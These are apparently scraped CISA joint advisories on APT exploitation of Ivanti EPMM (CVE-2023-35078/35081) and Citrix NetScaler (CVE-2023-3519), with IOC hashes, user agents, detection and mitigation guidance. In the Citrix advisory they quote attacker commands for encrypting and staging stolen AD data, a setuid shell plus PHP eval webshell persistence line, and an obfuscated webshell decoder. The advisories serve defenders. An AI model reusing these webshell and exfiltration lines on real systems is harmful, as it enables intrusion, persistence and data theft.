78988c65e9b70e7929e747408d8f0b0e
79c6d12d168b85437384b20eb94e106b
7b4137b4e85f31a81bb5bafeda993947
7b9db1d58326c1fa276ba2a39bcc2617
7cbc7459db5327c26476549f225030f5
7cd727171c2522f51417edeeba4f1791
7e3630c67c802eabb67b108ad4d7ded7
802f5d34c230da40c0912a1c5a9b702b
80bd0f3610f6c4d60584a5be0b8a3016
819030799f0020ed724c2ef3ffaa56c6
8207129585da68066ed08e94216d76ee
821f649d08687e22f96cea99fbb5d3a3
830838cb0620d659405a74401cd72557
833d3201066f5184c874c73a2083c448
840f488b7c0a5d686d1e89908735f354
84301b967a4d9a242466c04901bad691
85c3fac6a9885362c448f434671e362f
883b9fe16e45c388968defc73a5fba7a
8a6b0ba3496eeca39d6d3f9bae830c90
8ad0fd4b78c89bd63b97343fda1eeccb
8b0ae9029974091df12210255aaecad6
8b297f8b219e968932293ee7a8242ca3
8bb1781e756a53cd00d9b2ec670fa21e
8d5515351afdf27b013f96a05bf45147
8fafa73e9985e05d0c1c964da770c567
905967b08bd44cfa60d969229921ac23
9188ef45ea917a91ec9b92b5dd8cd90d
918dfab0333ae15d61f14fd24b5eaaac
922a3272aad17c9eaad733696a4321da
9253399537fad8448f1d4732dd79f6fa
934a8a6528e91caa019acb76e791a71d
95588e0386206fa02912cfcaf18c1220
9610328cdaa4694800c2c93410f8ce82
9622902cc43f4a20d0d686a37e4d8232
96c41e4c4a1812187fb279b9299ad63b
984c4653a563b19c87f264611a6adc01
9980febfaf901d4113a1c473f79d7eb6
9a176d818edff838fc057cea3ee372c0
9ba21c5148913186a5bf877078cbc048
9cfda02ef7e04c469b77f8197a249c17
9d74d395bd2f72a47a5c980e6040df5a
9df128ebe0c82064aa746647883112c9
9e5613533972a9d42d2e3344a4e58566
9ec17429eed5446e3720796ab50d8c60
9f2438aaab4744c4b7b5b7287a783099
9f3bf94572344b36f6ef1689cb30c66e
9fdd7a85b3a4ef8ded73beb3e6218109
a1b732a9af792f75a68ed78d72ffb8f6
a260d836428cdb971bdf147ca6940160
a4f11b1eb659869a0ae70898a4a0e5ee
a596ebbcf438980c880d711315e4fdf1
a80b6a354b493264f37aa39d0d41b5fc
a89df6156eb5a2de196388d4a123b470
a96837fe533247abb7f88000d0216a50
a98cf0a359f430a00f4f3d522f5b6cc0
aa2fe3a253e169b05e1782ca57a688d2
aef0172a2c03f77912de0bbf14aee00f
af06c3e72f2f307515ba549174d8e5a6
b311ab82b30f41b12cb9089d00c4a1ff
b4f31423445b5f13675f205ac997f41f
b50666c9aed1c2f222c56b6e9b326d27
b53f179b3f25f72bb0c7ccf45bf8beee
b57f3e41c03803306b0ee2111f7ef823
b79434613820faf30d58f103c4415a29
b8366aaa5ed51c0dea3fc90ef7e14889
b8f6b0d234a305c25411e83fd430c624
b956ed2b848dabb4e79ab7358233861b
b9ecb08402df0f1f6e1ce76b8ad6e91f
ba4a616c8d4ab9358a82b321d8e618bf
bcd62f3e029f96f62c24d50d2d1402ac
bcf75736d176394f3df69f3e0ef7dd9f
be1f24457141d80206bc2e58f55dc879
c013f308d170aa2eca4a5b0f0bbd3ccb
c0a2fd066c955137036f92da2c3a3ff1
c17b3ec40ed5216e44311138aafaea2c
c262a39f49604f05a5656213f758cd46
c66f36eb180438882133717c3abb5157
c986c7bf720ce1463c3d628d2b3dad01
c9c16287cbbe5a037244e374ba84aecc
cbcd728a2350712b5747cd3447473deb
cbeeb123efe8cf7f842426b673415c28
ccb15eef4287c8efa472915bcb4ec458
ccdddb69e9344a039c4ac9c49a6f2d7b
cd1312be032256a10cf866af3e9afae9
ce0dd163d9e02bfd42d61024523cb134
ceef2e728db1b5ae15432f844eeb66e1
d12d98a0877f6e3c8b5a59f41cc4de9b
d131f17689f1f585e9bfdcdb72a626bb
d173076d97a0400a56c81089912b9218
d255291bb8e460626cb906ebacc670e5
d2cea317778ad6412c458a8a33b964fd
d3cfee76468a9556fd9d017c1c8ee028
d3d72f4c7038f7313ad0570e16c293bf
d485a1b5db2f97dc56500376d677aa89
d662d20507bebc37b99a4d413afa2752
d711d577b9943ab4e2f8a2e06bb963e3
d92e87d2689957765987e2be732d728e
d966c6c822122e96f6e9f5f1d4778391
daee31d7cc6e08ead6afad2175989e1d
dbb293176747fa1c2e03cbc09433f236
dc26ef761c7ec40591b1fe6e561b521d
dc9e6edeb7557bc80be68be15cebb77a
dddfbae77336120febd5ad690af3e341
e1f579227327ebb21cde3f9e7511db01
e3c642432a815a07f035e01308aaa8fc
e54329351788661f2a8d4677a759fc42
e82b7ad2c05f4617efbc86a78c1e61e9
e99cffa2afa064625f09e1c5aca8f961
ea6bd3db104ca210b5ad947d46134aaf
eb277d809a59d39d02605c0edd9333e9
ed82a50d98700179c8ae70429457477a
ef35374f4146b3532f0902d6f7f0ef8c
ef4c4d79f02ac404f47513d3a73e20c7
f05a5a60ad6f92d6f28fa4f13ded952f
f0776dfe17867709fdb0e0183ed71698
f20fbfd508e24d50522eadf0186b03eb
f3d751b0585855077b46dfce226cfea1
f4dd9bb28d680a3368136fb3755e7ea9
f804388f302af1f999e4664543c885a1
f8bcc8f99a3afde66d7f5afb5d8f1b43
f8d6f89aecf792e844e72015c9f27c95
f967460f8c6de1cedb180c90c98bfe98
f9d5cc0cbae77ea1a371131f62662b6b
fa4f1a3b215888bc5f19b9f91ba37519
fdff2bf247a7dad40bac228853d5a661
fe6e7fac4f0b4f25d215e28ca8a22957
fe9de1cdd645971c5d15ee1873c3ff8d
febba89b4b9a9649b3a3bf41c4c7d853




NCSC-NO observed the following user agents communicating with Exchange (OWA and EWS):




Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Edg/92.0.902.67




NCSC-NO observed the following user agents communicating with Exchange webshell:




Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0_1 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8A306 Safari/6531.22.7
Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7
Mozilla/5.0 (Linux; Android 7.0; Moto C Build/NRD90M.059) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.02272.101 Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J120M Build/LMY47X) AppleWebKit/537.36 (KHTML, Like Gecko) SamsungBrowser/6.4 Chrome/56.0.2924.87 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 9_0_2 like Mac OS X) AppleWebKit/601.1.45 (KHTML, like Gecko) Version/9.0 Mobile/13A452 Safari/601.1




NCSC-NO observed the following user agents communicating with Exchange Autodiscover:




ExchangeServicesClient/15.00.0913.015
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Edg/92.0.902.67
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/114.0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.0.0




NCSC-NO observed the following user agents communicating with EWS (/ews/Exchange.asmx):




Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.49
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Edg/92.0.902.67




NCSC-NO observed the following user agent communicating with Exchange (/powershell):



Windows WinRM Client



 
 






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1059', 'T1190', 'T1090', 'T1087.002', 'T1070', 'T1036.005', 'T1018', 'T1572', 'T1505.003', 'T1005', 'T1090.001'}","



SUMMARY
The Cybersecurity and Infrastructure Security Agency (CISA) and the Norwegian National Cyber Security Centre (NCSC-NO) are releasing this joint Cybersecurity Advisory (CSA) in response to active exploitation of CVE-2023-35078 and CVE-2023-35081. Advanced persistent threat (APT) actors exploited CVE-2023-35078 as a zero day from at least April 2023 through July 2023 to gather information from several Norwegian organizations, as well as to gain access to and compromise a Norwegian government agency’s network.
Ivanti released a patch for CVE-2023-35078 on July 23, 2023. Ivanti later determined actors could use CVE-2023-35078 in conjunction with another vulnerability CVE-2023-35081 and released a patch for the second vulnerability on July 28, 2023. NCSC-NO observed possible vulnerability chaining of CVE-2023-35081 and CVE-2023-35078.
CVE-2023-35078 is a critical vulnerability affecting Ivanti Endpoint Manager Mobile (EPMM) (formerly known as MobileIron Core). The vulnerability allows threat actors to access personally identifiable information (PII) and gain the ability to make configuration changes on compromised systems. CVE-2023-35081 enables actors with EPMM administrator privileges to write arbitrary files with the operating system privileges of the EPMM web application server. Threat actors can chain these vulnerabilities to gain initial, privileged access to EPMM systems and execute uploaded files, such as webshells.
Mobile device management (MDM) systems are attractive targets for threat actors because they provide elevated access to thousands of mobile devices, and APT actors have exploited a previous MobileIron vulnerability. Consequently, CISA and NCSC-NO are concerned about the potential for widespread exploitation in government and private sector networks.
This CSA provides indicators of compromise (IOCs) and tactics, techniques, and procedures (TTPs) obtained by NCSC-NO investigations. The CSA also includes a nuclei template to identify unpatched devices and detection guidance organizations can use to hunt for compromise. CISA and NCSC-NO encourage organizations to hunt for malicious activity using the detection guidance in this CSA. If potential compromise is detected, organizations should apply the incident response recommendations included in this CSA. If no compromise is detected, organizations should still immediately apply patches released by Ivanti.
Download the PDF version of this report:


AA23-213A PDF
(PDF,       492.43 KB
  )


Download the .xml or .json file associated with this report:


AA23-213A STIX XML
(XML,       277.43 KB
  )




AA23-213A STIX JSON
(JSON,       250.01 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 13. See the MITRE ATT&CK Tactics and Techniques section of this advisory for a table of the threat actors’ activity mapped to MITRE ATT&CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Overview
In July 2023, NCSC-NO became aware of APT actors exploiting a zero-day vulnerability in Ivanti Endpoint Manager (EPMM), formerly known as MobileIron Core, to target a Norwegian government network. Ivanti confirmed that the threat actors exploited CVE-2023-35078 and released a patch on July 23, 2023.,1, Ivanti later determined actors could use CVE-2023-35078 in conjunction with another vulnerability, CVE-2023-35081, and released a patch for the second vulnerability on July 28, 2023.,2,
CVE-2023-35078 is a critical authentication bypass,CWE-288, vulnerability affecting Ivanti Endpoint Manager Mobile (EPMM), formerly known as MobileIron Core. The vulnerability allows unauthenticated access to specific application programming interface (API) paths. Threat actors with access to these API paths can access PII such as names, phone numbers, and other mobile device details of users on the vulnerable system; make configuration changes to vulnerable systems; push new packages to mobile endpoints; and access Global Positioning System (GPS) data if enabled.
According to Ivanti, CVE-2023-35078 can be chained with a second vulnerability CVE-2023-35081.,2, CVE-2023-35081 is directory traversal vulnerability,CWE-22, in EPMM. This vulnerability allows threat actors with EPMM administrator privileges the capability to write arbitrary files, such as webshells, with operating system privileges of the EPMM web application server. The actors can then execute the uploaded file.,2,
CISA added CVE-2023-35078 to its Known Exploited Vulnerabilities Catalog on July 25, 2023, and CVE-2023-35081 on July 31, 2023.
CISA and NCSC-NO are concerned about the potential for widespread exploitation of both vulnerabilities in government and private sector networks because MDM systems provide elevated access to thousands of mobile devices. Threat actors, including APT actors, have previously exploited a MobileIron vulnerability,3,4,.
APT Actor Activity
The APT actors have exploited CVE-2023-35078 since at least April 2023. The actors leveraged compromised small office/home office (SOHO) routers, including ASUS routers, to proxy, to target infrastructure, and NCSC-NO observed the actors exploiting CVE-2023-35078 to obtain initial access to EPMM devices, and:

Perform arbitrary Lightweight Directory Access Protocol (LDAP) queries against the Active Directory (AD).
Retrieve LDAP endpoints,.
Use API path /mifs/aad/api/v2/authorized/users to list users and administrators, on the EPMM device.
Make EPMM configuration changes (Note: It is unknown what configuration changes the actors made).
Regularly check EPMM Core audit logs,.

The APT actors deleted some of their entries in Apache httpd logs, using mi.war, a malicious Tomcat application that deletes log entries based on the string in keywords.txt. The actors deleted log entries with the string Firefox/107.0.
The APT actors used Linux and Windows user agents with Firefox/107.0 to communicate with EPMM. Other agents were used; however, these user agents did not appear in the device logs. It is unconfirmed how the threat actors ran shell commands on the EPMM device; however, NCSC-NO suspects the actors exploited CVE-2023-35081 to upload webshells on the EPMM device and run commands,.
The APT actors tunneled traffic, from the internet through Ivanti Sentry, an application gateway appliance that supports EPMM, to at least one Exchange server that was not accessible from the internet,. It is unknown how they tunneled traffic. NCSC-NO observed that the network traffic used the TLS certificate of the internal Exchange server. The APT actors likely installed webshells, on the Exchange server in the following paths,:

/owa/auth/logon.aspx
/owa/auth/logoff.aspx
/owa/auth/OutlookCN.aspx

NCSC-NO also observed mi.war on Ivanti Sentry but do not know how the actors placed it there.
MITRE ATT&CK TACTICS AND TECHNIQUES
See Table 1—Table 7 for all referenced threat actor tactics and techniques in this advisory.
Table 1: APT Actors ATT&CK Techniques for Initial Access

Table 2: APT Actors ATT&CK Techniques for Execution

Table 3: APT Actors ATT&CK Techniques for Discovery

Table 4: APT Actors ATT&CK Techniques for Persistence

Table 5: APT Actor ATT&CK Techniques for Defense Evasion

Table 6: APT Actor ATT&CK Techniques for Collection

Table 7: APT Actor ATT&CK Techniques for Command and Control

EVIDENCE OF VULNERABILITY METHODS
CISA recommends administrators use the following CISA-developed nuclei template to determine vulnerability to CVE-2023-30578:

CISA recommends administrators use the following CISA-developed nuclei template to determine vulnerability to CVE-2023-35081:

Run the following NCSC-NO-created checks to check for signs of compromise:

Investigate logs in centralized logging solutions or forwarded syslogs from EPMM devices for any occurrences of /mifs/aad/api/v2/.
Look for spikes or an increase of EventCode=1644 in the AD since at least April 2023. The LDAP queries performed by EPMM when the threat actor used the MIFS API generated tens of millions of this event code. Also look for EventCodes 4662, 5136, and 1153.
To detect tunneling activity through Sentry, look for traffic from EPMM devices to other internal servers, as well as TLS traffic towards instances of EPMM with different TLS certificates than the instance itself would possess. Traffic to EPMM with certificates originating from endpoints further inside the network, e.g. standard Windows generated certificates such as CN=EXCHANGE01 or similar.
Perform forensic analysis of disk and memory since log retention may be poor and threat actors have been observed deleting log entries. Pay particular attention to unallocated disk space (free space on filesystem).
Check for activity from ASUS routers in your own country towards EPMM and Sentry devices.

INCIDENT RESPONSE
If compromise is detected, organizations should:

Quarantine or take offline potentially affected hosts.
Reimage compromised hosts.
Provision new account credentials.
Collect and review artifacts such as running processes/services, unusual authentications, and recent network connections.
Report the compromise to CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888-282-0870) or to NCSC-NO via NCSC-NO's 24/7 Operations Center (cert@ncsc.no or +47 23 31 07 50).

MITIGATIONS
CISA and NCSC-NO recommend organizations:

Upgrade Ivanti EPMM versions to the latest version as soon as possible. See Ivanti CVE-2023-35081 - Remote Arbitrary File Write for patch information. This patch protects against CVE-2023-35078 and CVE-2023-35081.

See the Evidence of Vulnerability Methods section of this advisory for CISA-developed nuclei templates to find any EPMM versions vulnerable to CVE-2023-35078 and CVE-2023-35081.
Organizations using unsupported versions (i.e., versions prior to 11.8.1.0) should immediately upgrade to a supported version. If you cannot immediately upgrade, apply the Ivanti-provided RPM fix for CVE-35078 (this workaround does not protect against CVE-2023-35081):

Login to command line shell (CLI) in enable mode.
Run the following command: # install rpm url https://support.mobileiron.com/ivanti-updates/ivanti-security-update-1.0.0-1.noarch.rp
See Ivanti’s Knowledge Base (KB) Remote unauthenticated API access vulnerability - CVE-2023-35078 for more information on the RPM fix.




Treat MDM systems as high-value assets (HVAs) with additional restrictions and monitoring. MDM systems provide elevated access to thousands of hosts and should be treated as high value assets (HVAs) with additional restrictions and monitoring.
Follow best cybersecurity practices in production and enterprise environments, including mandating phishing-resistant multifactor authentication (MFA) for all staff and services. For additional best practices, see CISA’s Cross-Sector Cybersecurity Performance Goals (CPGs). The CPGs, developed by CISA and the National Institute of Standards and Technology (NIST), are a prioritized subset of IT and OT security practices that can meaningfully reduce the likelihood and impact of known cyber risks and common TTPs. Because the CPGs are a subset of best practices, CISA and NCSC-NO also recommend software manufacturers implement a comprehensive information security program based on a recognized framework, such as the NIST Cybersecurity Framework (CSF).

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, CISA and NCSC-NO recommends exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started: 

Select an ATT&CK technique described in this advisory (see Table 1–Table 7).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA recommends continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
REFERENCES,1, Ivanti: CVE-2023-35078 – Remote Unauthenticated API Access Vulnerability,2, Ivanti: CVE-2023-35081 – Remote Arbitrary File Write,3, CISA: Potential for China Cyber Response to Heightened U.S.-China Tensions,4, CISA: Top Routinely Exploited Vulnerabilities
RESOURCES

Mnemonic: Ivanti Endpoint Manager Mobile (EPMM) Authentication Bypass Vulnerability
Mnemonic: Threat Advisory: Remote File Write Vulnerability in Ivanti EPMM

ACKNOWLEDGEMENTS
Ivanti contributed to this joint advisory.
NCSC-NO wishes to acknowledge Mnemonic’s contributions.
VERSION HISTORY
August 1, 2023: Initial version.
August 2, 2023: Added stix file, updated Acknowledgements section, and added Resources section.
APPENDIX: INDICATORS OF COMPROMISE
NCSC-NO observed the following webshell hash:

NCSC-NO observed the following hash of mi.war:

NCSC-NO observed the following JA3 hashes used against MobileIron Core:

NCSC-NO observed the following JA3 hashes used against Exchange when tunneling via EPMM Sentry:

NCSC-NO observed the following user agents communicating with Exchange (OWA and EWS):

NCSC-NO observed the following user agents communicating with Exchange webshell:

NCSC-NO observed the following user agents communicating with Exchange Autodiscover:

NCSC-NO observed the following user agents communicating with EWS (/ews/Exchange.asmx):

NCSC-NO observed the following user agent communicating with Exchange (/powershell):

 
 






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-213a
22,"



SUMMARY
Update September 6, 2023:
This Cybersecurity Advisory has been updated with new tactics, techniques, and procedures (TTPs) as well as indicators of compromise (IOCs) received from an additional victim and trusted third parties.
Update End
The Cybersecurity and Infrastructure Security Agency (CISA) is releasing this Cybersecurity Advisory to warn network defenders about exploitation of CVE-2023-3519, an unauthenticated remote code execution (RCE) vulnerability affecting NetScaler (formerly Citrix) Application Delivery Controller (ADC) and NetScaler Gateway. In June 2023, threat actors exploited this vulnerability as a zero-day to drop a webshell on a critical infrastructure organization’s non-production environment NetScaler ADC appliance. The webshell enabled the actors to perform discovery on the victim’s active directory (AD) and collect and exfiltrate AD data. The actors attempted to move laterally to a domain controller but network-segmentation controls for the appliance blocked movement.
The victim organization identified the compromise and reported the activity to CISA and Citrix. Citrix released a patch for this vulnerability on July 18, 2023.
This advisory provides TTPs and detection methods shared with CISA by the victim. CISA encourages critical infrastructure organizations to use the detection guidance included in this advisory for help with determining system compromise. If potential compromise is detected, organizations should apply the incident response recommendations provided in this CSA. If no compromise is detected, organizations should immediately apply patches provided by Citrix.
Download the PDF version of this report:


AA23-201A Threat Actors Exploiting Citrix CVE-2023-3519 to Implant Webshells
(PDF,       560.29 KB
  )


Update September 6, 2023:
In August 2023, CISA received TTPs and IOCs from an additional victim and trusted third parties. This CSA has been updated with the TTPs and IOCs to assist administrators with detecting and responding to this activity.
For a downloadable list of IOCs, see the following XML and JSON files:


AA23-201A STIX XML
(XML,       43.13 KB
  )




AA23-201A STIX JSON
(JSON,       40.09 KB
  )


Update End
 
TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 13. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Overview
In July 2023, a critical infrastructure organization reported to CISA that threat actors may have exploited a zero-day vulnerability in NetScaler ADC to implant a webshell on their non-production NetScaler ADC appliance. Citrix confirmed that the actors exploited a zero-day vulnerability: CVE-2023-3519. Citrix released a patch on July 18, 2023.[1]
Update September 6, 2023:
In August 2023, CISA received TTPs and IOCs from an additional victim and third parties. The actors implanted a webshell, gained root level access to the compromised system, and performed discovery against the Active Directory (AD). For information, see the Victim 2 and Additional Observed Activity sections.
Update End
CVE-2023-3519
CVE-2023-3519 is an unauthenticated RCE vulnerability affecting the following versions of NetScaler ADC and NetScaler Gateway:[1]

NetScaler ADC and NetScaler Gateway 13.1 before 13.1-49.13
NetScaler ADC and NetScaler Gateway 13.0 before 13.0-91.13
NetScaler ADC and NetScaler Gateway version 12.1, now end of life
NetScaler ADC 13.1-FIPS before 13.1-37.159
NetScaler ADC 12.1-FIPS before 12.1-55.297
NetScaler ADC 12.1-NDcPP before 12.1-55.297

The affected appliance must be configured as a Gateway (VPN virtual server, ICA Proxy, CVPN, RDP Proxy) or authentication, authorization, and auditing (AAA) virtual server for exploitation.[1]
CISA added CVE-2023-3519 to its Known Exploited Vulnerabilities Catalog on July 19, 2023.
Threat Actor Activity
Victim 1
As part of their initial exploit chain [T1190], the threat actors uploaded a TGZ file [T1105] containing a generic webshell [T1505.003], discovery script [TA0007], and setuid binary [T1548.001] on the ADC appliance and conducted SMB scanning on the subnet [T1046].
The actors used the webshell for AD enumeration [T1016] and to exfiltrate AD data [TA0010]. Specifically, the actors:

Viewed NetScaler configuration files /flash/nsconfig/keys/updated/* and /nsconfig/ns.conf [T1005]. Note: These configuration files contain an encrypted password that can be decrypted by the key stored on the ADC appliance [T1552.001].
Viewed the NetScaler decryption keys (to decrypt the AD credential from the configuration file) [T1552.004].
Used the decrypted AD credential to query the AD via ldapsearch. The actors queried for:

Users (objectClass=user) (objectcategory=person) [T1033]
Computers (objectClass=computer) [T1018]
Groups (objectClass=group) [T1069.002]
Subnets (objectClass=subnet)
Organizational Units (objectClass=organizationalUnit)
Contacts (objectClass=contact)
Partitions (objectClass=partition)
Trusts (objectClass=trustedDomain) [T1482]


Used the following command to encrypt discovery data collected via openssl in “tar ball” [T1560.001]: tar -czvf - /var/tmp/all.txt | openssl des3 -salt -k <> -out /var/tmp/test.tar.gz. (A “tar ball” is a compressed and zipped file used by threat actors for collection and exfiltration.)
Exfiltrated collected data by uploading as an image file [T1036.008] to a web-accessible path [T1074]: cp /var/tmp/test.tar.gz /netscaler/ns_gui/vpn/medialogininit.png.

The actors’ other discovery activities were unsuccessful due to the critical infrastructure organization’s deployment of their NetScaler ADC appliance in a segmented environment. The actors attempted to:

Execute a subnet-wide curl command to identify what was accessible from within the network as well as potential lateral movement targets.
Verified outbound network connectivity with a ping command (ping -c 1 google.com) [T1016.001].
Executed host commands for a subnet-wide DNS lookup.

The actors also attempted to delete their artifacts [TA0005]. The actors deleted the authorization configuration file (/etc/auth.conf)—likely to prevent configured users (e.g., admin) from logging in remotely (e.g., CLI) [T1531]. To regain access to the ADC appliance, the organization would normally reboot into single use mode, which may have deleted artifacts from the device; however, the victim had a Secure Shell (SSH) key readily available that allowed them into the appliance without rebooting it.
The actors’ post-exploitation lateral movement attempts were also blocked by network-segmentation controls. The actors implanted a second webshell on the victim that they later removed. This was likely a PHP shell with proxying capability. The actors likely used this to attempt proxying SMB traffic to the DC [T1090.001] (the victim observed SMB connections where the actors attempted to use the previously decrypted AD credential to authenticate with the DC from the ADC via a virtual machine). Firewall and account restrictions (only certain internal accounts could authenticate to the DC) blocked this activity.
Update September 6, 2023:
Victim 2
Threat actors uploaded a PHP webshell *logouttm.php* [T1036.005], likely as part of their initial exploit chain, to */netscaler/ns_gui/vpn/. Within an hour of installing the webshell, the actors implanted an Executable and Linkable Format (ELF) binary pykeygen that set user unique identifier (UID) to root and executed /bin/sh [T1059.004] via setuid and execve syscall.* [T1106]. Note: A third party also observed threat actors use an ELF binary (named pip4) to execute /bin/sh via syscall and change the UID to root. pip4 was located at /var/python/bin.
With root level access, the actors used hands-on-keyboard for discovery. They queried the AD via ldapsearch for users, groups, and computers. They collected the data in gzipped text files renamed 1.css and 2.css and placed the files in /netscaler/ns_gui/vpn/ for exfiltration.
After exfiltrating the files, the actors deleted them from the system [T1070.004] as well as some access logs, error logs, and authentication logs [T1070.002]. The victim organization detected the intrusion and mitigated the activity but did not identify signs of additional malicious activity.
For command and control (C2), the actors appeared to use compromised pfSense devices [T1584]; the victim observed communications with two pfSense IP addresses indicating the actor was using them for multi-hop proxying C2 traffic [T1090.003].
Additional Observed Activity
According to trusted third party reporting, threat actors leveraged open source webshells and other publicly available tools [T1588.002]:

Loaded loading[.]php to /vpn/vpn/. Loading[.]php is a modified version of an open-source PHP webshell [2]. The modified webshell had a custom protocol handler, update://, created via a stream_wrapper_register (https://www.php.net/manual/en/function.stream-wrapper-register[.]php). The custom protocol enabled the webshell to send encoded commands to the AD via ldapsearch:





public function stream_open($path, $mode, $options, &$opened_path)
   {
       $this->code = hex2bin(substr(base64_decode(strrev(substr(substr($path,9),5))),2));
       $this->position = 0;
       return true;
   }





Loaded a modified version of open-source SSH inject tool [3] named libnsd.so to the /tmp directory. The file hooks SSH and captures credentials. The actors' modifications to the tool wrote encoded captured credentials (20 random characters + reversed/base64) to a file created in a hard-coded path (/var/nslog/counters/prometheus/metrc_codes_client.log) [T1074.001]. The actors then exfiltrated the collected credentials and deleted /var/nslog/counters/prometheus/metrc_codes_client.log 3 minutes after exfiltration). (The deleted file was recreated, possibly because the actors’ memory hook was still active.)
Deployed webshells to victim networks at \vpn\themes.

One third party observed the actors deploy the SECRETSAUCE webshell. SECRETSAUCE is a webshell written in PHP. It can receive PHP code from an HTTP POST request, decrypt it using an internally embedded RSA public key [T1140], and execute the code in memory; each request to the webshell returns an HTTP 500 response code. The actor has used the following file names for SECRETSAUCE: vpn[.]php, logout[.]php, log[.]php, prod[.]php [T1036].
A second third party observed the actors deploy an open source webshell [4] with filename defaults.php.


Deployed LIGOLO-NG [5] tunneller with the filename the in the /tmp directory. LIGOLO-NG is a tunneller [T1572] written in Go that provides encrypted reverse TCP/TLS connections [T1573.002] to a remote host.
Deployed the NPS tunneller [6] to victim networks to the /tmp directory. NPS is an open source tunneller written in Go. It must be configured from the command line or via a configuration file. Features including support for most common protocols and extensions, including compression, encryption, and port reuse.

Additionally, threat actors:

Appended /flash/nsconfig/rc.netscaler with:chmod u+s /bin/shecho “<?php http_response_code(401);@eval(\$_REQUEST[‘variable’]);?>” > /[redacted path to webshell]/[redacted].php [T1222.002].

The webshell path was in a web accessible folder, and the actors’ modifications enabled them to run /bin/sh commands as root and enabled persistence because the webshell was run on every reboot [T1547].

Used Sysinternals ADExplorer, a Microsoft tool for viewing and editing the AD [7]. The actors dropped the tool to C:\Users\<redacted>\AppData\Local\Temp\ADExplorer.exe and executed it with the following command: ADExplorer.exe -snapshot """" <filename>.dat /accepteula.

Update End
MITRE ATT&CK TACTICS AND TECHNIQUES
See Table 1–Table 11 for all referenced threat actor tactics and techniques in this advisory.
Update September 6, 2023
The tables have been updated with the following techniques:

Compromise Infrastructure [T1584]
Obtain Capabilities: Tool [T1588.002]
Command and Scripting Interpreter: Unix Shell [T1059.004]
Native API [T1106]
Boot or Logon Autostart Execution [T1547]
Proxy: Multi-hop Proxy [T1090.003]
Deobfuscate/Decode Files or Information [T1140]
File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification [T1222.002]
Indicator Removal [T1070]
Indicator Removal: Clear Linux or Mac System Logs [T1070.002]
Indicator Removal: File Deletion [T1070.004]
Masquerading [T1036]
Masquerading: Match Legitimate Name or Location [T1036.005]
Data Staged: Local Data Staging [T1074.001]
Protocol Tunneling [T1572]

End Update

Table 1: Cyber Threat Actors ATT&CK Techniques for Resource Development


Technique Title
ID
Use




Compromise Infrastructure
T1584
The threat actors appear to have used compromised pfSense devices to proxy C2 traffic to Victim 2.


Obtain Capabilities: Tool
T1588.002
The threat actors leveraged open source webshells [2] [4] and other publicly available tools, including a modified version of open-source SSH inject tool [3], LIGOLO-NG [5] tunneller, and NPS tunneller [6].



 

Table 2: Cyber Threat Actors ATT&CK Techniques for Initial Access


Technique Title
ID
Use




Exploit Public-Facing Application
T1190
The threat actors exploited CVE-2023-3519 to implant a webshell on the organization’s NetScaler ADC appliance.



 

Table 3: Cyber Threat Actors ATT&CK Techniques for Execution


Technique Title
ID
Use




Command and Scripting Interpreter: Unix Shell
T1059.004
The threat actors executed /bin/sh as root.


Native API
T1106
The threat actors executed /bin/sh via syscall.



 

Table 4: Cyber Threat Actors ATT&CK Techniques for Persistence


Technique Title
ID
Use




Boot or Logon Autostart Execution
T1547
Threat actors used /flash/nsconfig/rc.netscaler rewrite a webshell on every reboot.


Server Software Component: Web Shell
T1505.003
The threat actors implanted a generic webshell on the organization’s NetScaler ADC appliance.



 

Table 5: Cyber Threat Actors ATT&CK Techniques for Privilege Escalation


Technique Title
ID
Use




Abuse Elevation Control Mechanism: Setuid and Setgid
T1548.001
